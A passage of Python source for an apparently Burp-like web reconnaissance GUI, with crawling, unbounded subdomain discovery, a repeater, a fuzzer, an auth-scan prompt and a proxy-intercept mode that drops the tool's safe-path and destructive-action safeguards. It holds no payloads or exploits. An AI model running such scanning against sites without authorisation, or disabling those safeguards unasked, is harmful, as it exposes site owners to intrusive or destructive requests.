        self.count_var.set(f'Nodes: {len(gp.nodes)}')
        self._status(f'Shell node created: {url}')

    def _add_edited_node(self, new_node: SiteNode):
        """Add a node produced by the Repeater or Fuzzer to the graph, giving it a
        unique URL by appending #edited-N when needed."""
        existing = self.graph_panel.nodes
        if new_node.url in existing:
            base = new_node.url.split('#', 1)[0]
            n = 1
            while f'{base}#edited-{n}' in existing:
                n += 1
            new_node.url = f'{base}#edited-{n}'
        self.graph_panel.add_node(new_node)
        self.count_var.set(f'Nodes: {len(self.graph_panel.nodes)}')
        self._status(f'Added edited node: {new_node.url}')

    def _save_proxy_saved_node(self, node: SiteNode):
        """Add a SiteNode saved from the Proxy panel / History popup to the graph
        (uniquifying its URL) and select it so the user sees where it landed."""
        self._add_edited_node(node)
        try:
            self.graph_panel._select_and_center(node.url)
        except Exception:
            pass
        self._status(f'Saved proxy transaction as node: {node.url}')

    def _repeat_proxy_saved_node(self, node: SiteNode):
        """Open the Repeater seeded with a node built from a proxied transaction;
        any result it saves becomes an edited graph node."""
        inspector.repeater(self.root, node, on_save=self._add_edited_node)

    def _open_wizard(self):
        """Open (or focus) the animated Wizard assistant. The MerlinAgent (sprite)
        is parsed once and reused; the dialog is a singleton and streams from the
        configured conversational model (default wizard-ai)."""
        win = getattr(self, '_wizard_win', None)
        if win is not None and win.winfo_exists():
            win.lift()
            win.focus_force()
            return
        if getattr(self, '_merlin_agent', None) is None:
            self._merlin_agent = MerlinAgent(scale=1.4)   # a bit bigger wizard
        self._wizard_win = WizardAssistantDialog(
            self.root, self._merlin_agent, self.ai,
            model=self.settings.get('wizard_model', 'wizard-ai'))

    def _delete_node(self):
        """Remove the currently-selected node from the graph. Only nodes
        produced by the Repeater / Fuzzer (i.e. those with node.edited == True)
        are eligible — original scan nodes are protected so they can't be wiped
        accidentally."""
        sel = self.graph_panel.selected
        if not sel or sel not in self.graph_panel.nodes:
            messagebox.showinfo(
                'No selection',
                'Select an edited node in the graph first.')
            return
        node = self.graph_panel.nodes[sel]
        if not getattr(node, 'edited', False):
            messagebox.showinfo(
                'Cannot delete',
                'Only nodes created via the Repeater or Fuzzer can be deleted.')
            return
        if not self.graph_panel.delete_node(sel):
            return
        self.count_var.set(f'Nodes: {len(self.graph_panel.nodes)}')
        self._status(f'Deleted node: {sel}')
        if self.info_panel.node and self.info_panel.node.url == sel:
            self.info_panel.node = None

    # ── Scan control ────────────────────────
    def _prompt_auth(self, node):
        """Scanner-thread entry point for an Auth scan credential prompt. Shows
        the modal AuthDialog on the UI thread and BLOCKS the calling scan thread
        until the user submits. Serialised by _auth_lock so concurrent scans
        queue rather than stack popups. Returns a credential dict or None."""
        lock = getattr(self, '_auth_lock', None)
        if lock is None:
            return None
        with lock:
            box, done = {}, threading.Event()

            def finish(cred):
                """Receive the dialog's result and release the waiting thread."""
                box['cred'] = cred
                done.set()

            def show():
                """Open the AuthDialog on the UI thread (release the waiter on
                failure so the scan can't hang)."""
                try:
                    AuthDialog(self.root, node, finish)
                except Exception as e:
                    self._status(f'Auth dialog error: {e}')
                    done.set()

            self.root.after(0, show)
            if not done.wait(timeout=600):
                return None
            return box.get('cred')

    def _scan_start(self):
        """Start a scan of the target URL: reset the graph and per-scan state,
        build the scanner with the chosen mode/scope/auth options, and run it on
        a background thread (also kicking off the tech scan)."""
        target = self.target_var.get().strip()
        if not target:
            messagebox.showwarning('No Target', 'Enter a target URL.')
            return

        # Complement vs fresh: if the target host already has a populated graph,
        # KEEP it and let this scan add to it — so a Browser crawl and a Fuzzing
        # pass (in either order) build up the SAME graph, each completing the
        # other. A scan of a new/empty target host starts fresh (clears). Use the
        # graph's Options ▸ Clear to force a clean slate on a re-scan.
        host = self.graph_panel._host_of(target)
        existing = self.graph_panel.graphs.get(host)
        complement = bool(existing and existing.get('nodes'))
        # Read the user's scope before clear() resets the field.
        scope = self.graph_panel.scope_text()
        if complement:
            self.graph_panel._activate(host)   # show/aggregate onto this graph
            self._status(f'Complementing existing graph for {host}')
        else:
            self.graph_panel.clear()
        # Pre-create the entry host's graph as the active/primary one, so a
        # subdomain discovered first (e.g. crt.sh in Aggressive mode) can't claim
        # the primary slot before the target's own nodes arrive. Restore the
        # user's scope onto it.
        self.graph_panel.ensure_graph(target)
        self.graph_panel.set_scope(scope)
        self.count_var.set(f'Nodes: {len(self.graph_panel.nodes)}')

        mode = self.scan_mode_var.get()
        auth_scan = bool(self.auth_scan_var.get())
        scan_type = self.scan_type_var.get()
        # Safe-path allowlist gating which non-GET endpoints are auto-probed.
        # Built once and shared by the primary scan and every sub-scan; an empty
        # textbox falls back to the read/query defaults. Fuzzing type uses no
        # whitelist (it only does GET path discovery).
        whitelist = None if scan_type == 'fuzzing' else SafePathWhitelist(
            self.settings.get('whitelist_paths') or DEFAULT_SAFE_PATHS,
            self.settings.get('whitelist_enabled', True))
        # Intercept-driven full-surface mode: with the proxy intercepting, route
        # the crawl browser through it and drop ALL safety gates (whitelist +
        # safe-click + destructive veto) so every control/param/POST body is
        # exercised; the user vets each request in the interceptor. Scope still
        # applies. Otherwise the crawl runs direct with the normal safeguards.
        intercept = bool(self.proxy is not None and self.proxy.intercept)
        if intercept:
            self.proxy.start()
            self.proxy.set_scope(scope)
        proxy_addr = f'127.0.0.1:{self.proxy.port}' if intercept else None
        unsafe = intercept
        if intercept:
            whitelist = None
            self._status('Intercept ON — crawl runs UNSAFE (no whitelist / safe '
                         'heuristics); vet each request in the Proxy panel.')
        # Per-host credential store, shared with sub-scans so a credential entered
        # once is reused everywhere for that host. Reset each scan (session-only).
        self._host_auth = {}
        self._auth_lock = threading.Lock()
        # Parameters reused for each per-subdomain scan spawned by _got_subdomain.
        self._scan_params = {
            'mode': mode, 'scope': scope, 'auth_scan': auth_scan,
            'whitelist': whitelist, 'scan_type': scan_type,
            'proxy': proxy_addr, 'unsafe': unsafe,
        }
        self._sub_scanners = []
        self._sub_hosts = set()
        self._sub_pending = deque()
        self._sub_running = 0
        self._tech_hosts = set()
        self._active_scans = 1
        self._primary_failed = self._primary_stopped = False
        self.graph_panel.set_scanning(True)
        self.scanner = scan(
            on_node=self._got_node,
            on_status=self._got_status,
            on_done=self._scan_done,
            on_subdomain=self._got_subdomain,
            headless=True,
            browser_geometry=self.settings.get('browser_geometry', ''),
            mode=mode,
            scope_pattern=scope,
            auth_scan=auth_scan,
            auth_callback=self._prompt_auth if auth_scan else None,
            host_auth=self._host_auth,
            whitelist=whitelist,
            scan_type=scan_type,
            proxy=proxy_addr,
            unsafe=unsafe,
        )
        self.scan_btn.config(state='disabled')
        self.stop_btn.config(state='normal')
        self.status_box.clear()
        self.progress.start()
        self._status(f'Scanning ({mode} · {scan_type}): {target}')

        threading.Thread(target=self.scanner.scan,
                         args=(target,), daemon=True).start()
        # The tech scan now always runs alongside a target scan (in its own
        # thread); the Tech Scan button just views the cached result.
        self._run_tech_scan(target, mode)

    def _scan_stop(self):
        """Stop the primary and all subdomain scans, drop queued subdomains,
        cancel the tech scan, and reset the toolbar buttons."""
        if self.scanner:
            self.scanner.stop()
        for s in getattr(self, '_sub_scanners', []):
            try:
                s.stop()
            except Exception:
                pass
        # Drop subdomains still waiting in the queue (they never started, so no
        # on_done will fire for them) and clear their outstanding-work count.
        while getattr(self, '_sub_pending', None):
            self._sub_pending.popleft()
            self._active_scans = max(0, self._active_scans - 1)
        self._tech_cancelled = True
        self.scan_btn.config(state='normal')
        self.stop_btn.config(state='disabled')
        self.graph_panel.set_scanning(False)

    def _got_node(self, node: SiteNode):
        """Scanner on_node callback: add the node to the graph and update the
        count, marshalled onto the UI thread."""
        def ui():
            """Apply the node addition on the UI thread. An anchor-only node (the
            Fuzzing entrance placeholder) is skipped when the URL already exists,
            so a Fuzzing pass never overwrites a Browser-crawled node — it just
            complements it with the new paths it found."""
            if (getattr(node, '_anchor_only', False)
                    and node.url in self.graph_panel.nodes):
                return
            self.graph_panel.add_node(node)
            self.count_var.set(f'Nodes: {len(self.graph_panel.nodes)}')
        self.root.after(0, ui)

    def _got_subdomain(self, host):
        """A sibling subdomain was discovered (passively, or via crt.sh in
        Aggressive mode). Every discovered host is fingerprinted (cheap, HTTP-only)
        so the JSON export covers it, and every host is queued for a full browser
        crawl. There is no cap on how many subdomains get crawled — discovery is
        unbounded; the only limiter is _MAX_CONCURRENT_SUBS (the user's max-
        concurrent-browsers setting), which throttles how many crawl AT ONCE while
        the rest wait in the queue. Runs on the UI thread."""
        def ui():
            """On the UI thread: always fingerprint the host (deduped), then
            queue a deep crawl (deduped). The crawl starts immediately if a
            browser slot is free, otherwise it waits its turn in the queue."""
            self._run_tech_scan('https://' + host + '/', self._scan_params.get('mode'),
                                reset_cancel=False)
            if host in self._sub_hosts:
                return
            self._sub_hosts.add(host)
            self.graph_panel.ensure_graph(host)
            self._active_scans += 1
            self._sub_pending.append(host)
            self._status(f'Subdomain queued: {host}')
            self._pump_sub_queue()
        self.root.after(0, ui)

    def _pump_sub_queue(self):
        """Start queued subdomain scans up to the concurrency limit. Called when a
        subdomain is queued and whenever one finishes (freeing a slot)."""
        p = self._scan_params
        while (self._sub_running < self._MAX_CONCURRENT_SUBS
               and self._sub_pending):
            host = self._sub_pending.popleft()
            self._sub_running += 1
            auth_scan = p.get('auth_scan', False)
            sub = scan(
                on_node=self._got_node,
                on_status=self._got_status,
                on_done=self._sub_scan_done,
                headless=True,
                browser_geometry='', mode=p.get('mode'),
                scope_pattern=p.get('scope', ''), subdomain_discovery=False,
                auth_scan=auth_scan,
                auth_callback=self._prompt_auth if auth_scan else None,
                host_auth=self._host_auth,
                whitelist=p.get('whitelist'),
                scan_type=p.get('scan_type', 'browser'),
                proxy=p.get('proxy'),
                unsafe=p.get('unsafe', False),
            )
            self._sub_scanners.append(sub)
            # Re-assert the in-progress UI in case the primary scan already ended.
            self.scan_btn.config(state='disabled')
            self.stop_btn.config(state='normal')
            self.graph_panel.set_scanning(True)
            self._status(f'Scanning subdomain: {host}')
            # Seed the sub-scan with real pages discovered for this host on the
            # primary site (sibling <a href> links), so a host whose '/' is a
            # dead end / redirect still gets its actual pages crawled.
            seeds = sorted(getattr(self.scanner, 'sub_seeds', {}).get(host, set()))
            threading.Thread(
                target=sub.scan,
                args=('https://' + host + '/',),
                kwargs={'seed_urls': seeds}, daemon=True).start()
            # (The per-host fingerprint is kicked off in _got_subdomain, so every
            # discovered host is covered even when its deep crawl is capped.)

    def _got_status(self, msg):
        """Scanner on_status callback: show `msg` in the status bar (UI thread)."""
        self.root.after(0, lambda: self._status(msg))

    def _scan_done(self):
        """Primary scan finished: capture its browser geometry + outcome, then
        fold into the shared completion accounting."""
        def ui():
            """On the UI thread: persist the browser geometry, record the
            primary scan's outcome, and update completion accounting."""
            rect = getattr(self.scanner, 'last_browser_rect', '') if self.scanner else ''
            if rect and rect != self.settings.get('browser_geometry', ''):
                self.settings['browser_geometry'] = rect
                save_settings(self.settings)
            self._primary_failed = bool(self.scanner and self.scanner.failed)
            self._primary_stopped = bool(self.scanner and self.scanner.stopped)
            self._one_scan_finished()
        self.root.after(0, ui)

    def _sub_scan_done(self):
        """Subdomain-scan completion callback: free its slot, start the next
        queued subdomain, and fold into the completion accounting."""
        def ui():
            """Apply the slot release and queue pump on the UI thread."""
            self._sub_running = max(0, self._sub_running - 1)
            self._pump_sub_queue()
            self._one_scan_finished()
        self.root.after(0, ui)

    def _one_scan_finished(self):
        """Decrement the live-scan count (primary + subdomains); finalize the UI
        only once every scan has completed."""
        self._active_scans = max(0, getattr(self, '_active_scans', 1) - 1)
        if self._active_scans > 0:
            return
        self.scan_btn.config(state='normal')
        self.stop_btn.config(state='disabled')
        self.progress.reset()
        self.graph_panel.set_scanning(False)
        n = len(self.graph_panel.nodes)
        if self._primary_failed:
            self.status_box.fail()
            self._status('Scan failed — see status log.')
        elif self._primary_stopped:
            self.status_box.fail()
            self._status(f'Scan stopped — {n} nodes in the current graph.')
        else:
            self.status_box.success()
            self._status(f'Scan complete — {n} nodes in the current graph.')

    def _clear(self):
        """Clear the graph and reset the node count, progress and status."""
        self.graph_panel.clear()
        self.count_var.set('Nodes: 0')
        self.progress.reset()
        self.status_box.clear()
        self._status('Graph cleared.')

    def _hide_dotfiles(self):
        """Hide dot-prefixed files/dirs in Tk file dialogs (no reveal toggle)."""
        try:
            # Force Tk to load its file-dialog implementation so the namespace
            # vars exist; the bogus option raises TclError after sourcing it.
            self.root.tk.call('tk_getSaveFile', '-invalidoption')
        except tk.TclError:
            pass
        for var, val in (('::tk::dialog::file::showHiddenVar', '0'),
                         ('::tk::dialog::file::showHiddenBtn', '0')):
            try:
                self.root.tk.call('set', var, val)
            except tk.TclError:
                pass

    def _save_json(self):
        """Export the active graph's nodes to a JSON file via a save dialog."""
        nodes = list(self.graph_panel.nodes.values())
        if not nodes:
            messagebox.showinfo('Nothing to Save', 'Run a scan first.')
            return
        self._hide_dotfiles()
        fn = filedialog.asksaveasfilename(
            title='Save scan data',
            defaultextension='.json',
            initialfile=f'reconner_scan_{datetime.now():%Y%m%d_%H%M%S}.json',
            filetypes=[('JSON files', '*.json'), ('All files', '*.*')])
        if not fn:
            return
        data = {
            'target':     self.target_var.get().strip(),
            'scanned_at': datetime.now().isoformat(timespec='seconds'),
            'node_count': len(nodes),
            'nodes':      [n.to_dict() for n in nodes],
        }
        if self.fingerprint_cache:
            data['fingerprints'] = {
                url: {'fp': entry.get('fp', ''), 'ai': entry.get('ai')}
                for url, entry in self.fingerprint_cache.items()
                if entry.get('fp') or entry.get('ai')
            }
        try:
            with open(fn, 'w', encoding='utf-8') as f:
                json.dump(data, f, ensure_ascii=False, indent=2)
            self._status(f'Saved {len(nodes)} nodes to {fn}')
            messagebox.showinfo('Saved', f'Saved {len(nodes)} nodes to:\n{fn}')
        except Exception as e:
            messagebox.showerror('Save Error', str(e))

    def _save_json_all(self):
        """Save every discovered subdomain graph into one JSON file, grouped by
        host. Mirrors _save_json but spans all graphs rather than the active one."""
        graphs = self.graph_panel.all_graphs()
        graphs = {h: ns for h, ns in graphs.items() if ns}
        total = sum(len(ns) for ns in graphs.values())
        if not total:
            messagebox.showinfo('Nothing to Save', 'Run a scan first.')
            return
        self._hide_dotfiles()
        fn = filedialog.asksaveasfilename(
            title='Save ALL graphs (every subdomain)',
            defaultextension='.json',
            initialfile=f'reconner_scan_all_{datetime.now():%Y%m%d_%H%M%S}.json',
            filetypes=[('JSON files', '*.json'), ('All files', '*.*')])
        if not fn:
            return
        data = {
            'target':      self.target_var.get().strip(),
            'scanned_at':  datetime.now().isoformat(timespec='seconds'),
            'graph_count': len(graphs),
            'node_count':  total,
            'graphs': [
                {'host': h, 'node_count': len(ns),
                 'nodes': [n.to_dict() for n in ns]}
                for h, ns in graphs.items()
            ],
        }
        if self.fingerprint_cache:
            data['fingerprints'] = {
                url: {'fp': entry.get('fp', ''), 'ai': entry.get('ai')}
                for url, entry in self.fingerprint_cache.items()
                if entry.get('fp') or entry.get('ai')
            }
        try:
            with open(fn, 'w', encoding='utf-8') as f:
                json.dump(data, f, ensure_ascii=False, indent=2)
            self._status(f'Saved {total} nodes across {len(graphs)} graph(s) to {fn}')
            messagebox.showinfo('Saved',
                                f'Saved {total} nodes across {len(graphs)} '
                                f'graph(s) to:\n{fn}')
        except Exception as e:
            messagebox.showerror('Save Error', str(e))

    def _load_json(self):
        """Rebuild the graph(s) + data from a previously-saved scan JSON, so a
        site can be reviewed offline without re-scanning. Accepts both the single-
        graph export ({nodes: …}) and the all-graphs export ({graphs: [{host,
        nodes}]}). Restores per-host fingerprints into the cache too."""
        if getattr(self, '_active_scans', 0) > 0:
            messagebox.showinfo('Scan running',
                                'Stop the current scan before loading a file.')
            return
        self._hide_dotfiles()
        fn = filedialog.askopenfilename(
            title='Load scan JSON',
            filetypes=[('JSON files', '*.json'), ('All files', '*.*')])
        if not fn:
            return
        try:
            with open(fn, encoding='utf-8') as f:
                data = json.load(f)
        except Exception as e:
            messagebox.showerror('Load Error', f'Could not read JSON:\n{e}')
            return
        # Gather node dicts from either export shape, preserving host order so the
        # original entry host stays the primary graph.
        node_dicts = []
        if isinstance(data, dict) and isinstance(data.get('graphs'), list):
            for g in data['graphs']:
                node_dicts.extend(g.get('nodes') or [])
        elif isinstance(data, dict) and isinstance(data.get('nodes'), list):
            node_dicts = data['nodes']
        else:
            messagebox.showerror('Load Error',
                                 'Unrecognised file: no "nodes" or "graphs".')
            return
        if not node_dicts:
            messagebox.showinfo('Nothing to load', 'The file has no nodes.')
            return

        self.graph_panel.clear()
        self.fingerprint_cache = {}
        loaded = 0
        for nd in node_dicts:
            try:
                node = SiteNode.from_dict(nd)
            except Exception:
                continue
            if node.url:
                self.graph_panel.add_node(node)
                loaded += 1
        # Restore fingerprints (per host) so the Tech Scan viewer / re-export work.
        fps = data.get('fingerprints') if isinstance(data, dict) else None
        if isinstance(fps, dict):
            for url, entry in fps.items():
                if isinstance(entry, dict):
                    self.fingerprint_cache[url] = {
                        'fp': entry.get('fp', '') or '',
                        'ai': entry.get('ai')}
        tgt = data.get('target') if isinstance(data, dict) else ''
        if tgt:
            self.target_var.set(tgt)
        self.count_var.set(f'Nodes: {len(self.graph_panel.nodes)}')
        self.status_box.success()
        self._status(f'Loaded {loaded} nodes from {fn}')
        messagebox.showinfo('Loaded', f'Loaded {loaded} nodes from:\n{fn}')

    def _shutdown(self):
        """Stop any in-flight scan, kill the browser subprocess, then exit hard
        so a lingering WebDriver/geckodriver child can't keep the process alive."""
        # Persist the current window geometry for the next launch.
        try:
            self.settings['window_geometry'] = self.root.geometry()
            save_settings(self.settings)
        except Exception:
            pass
        # Cancel any queued/running fingerprint jobs (cooperative via
        # _tech_cancelled; the pool drop releases its worker threads).
        self._tech_cancelled = True
        try:
            self._fp_pool.shutdown(wait=False, cancel_futures=True)
        except Exception:
            pass
        # Stop the proxy listener and kill any browser we launched through it.
        try:
            if getattr(self, 'proxy', None) is not None:
                self.proxy.stop()
        except Exception:
            pass
        try:
            proc = getattr(self, '_browser_proc', None)
            if proc is not None and proc.poll() is None:
                proc.terminate()
        except Exception:
            pass
        if self.scanner:
            try:
                self.scanner.stop()
            except Exception:
                pass
            drv = getattr(self.scanner, 'driver', None)
            if drv:
                # Capture the current browser geometry before killing it.
                try:
                    pos = drv.get_window_position()
                    sz  = drv.get_window_size()
                    self.settings['browser_geometry'] = (
                        f"{sz['width']}x{sz['height']}+{pos['x']}+{pos['y']}")
                    save_settings(self.settings)
                except Exception:
                    pass
                try:
                    drv.quit()
                except Exception:
                    pass
        try:
            self.root.destroy()
        except Exception:
            pass
        os._exit(0)

    def run(self):
        """Run the Tk main loop until the window is closed."""
        self.root.protocol('WM_DELETE_WINDOW', self._shutdown)
        try:
            self.root.mainloop()
        except KeyboardInterrupt:
            self._shutdown()


if __name__ == '__main__':
    import sys
    if '--gen-icons' in sys.argv:
        files = generate_node_icons(force=True)
        print(f'Wrote {len(files)} node icon(s) to {_node_icon_dir()}')
        for f in files:
            print('  ' + f)
    else:
        # Make sure the node-icon PNGs exist so nodes always render as images
        # (never a fallback marker); writes only the missing ones.
        try:
            generate_node_icons(force=False)
        except Exception:
            pass
        app().run()
